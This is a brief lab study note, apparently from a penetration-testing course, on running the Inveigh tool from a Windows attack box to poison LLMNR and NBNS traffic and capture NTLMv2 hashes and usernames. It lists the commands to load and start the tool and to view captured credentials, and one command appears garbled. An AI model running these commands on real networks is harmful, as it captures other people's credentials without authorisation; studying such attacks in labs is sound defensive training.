
## Inveigh - Overview
- Can be used if out attack box is a windows machine.
- Similar to responder

## Using Inveigh

```python
PS C:\htb> Import-Module .\Inveigh.ps1 PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```

#### LLMNR and NBNS

```python
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Let's go ahead and run the C# version with the defaults and start capturing hashes.


```python
PS C:\htb> .\Inveigh.exe
```
- Press escape key to get to the console
- We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`
- We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected
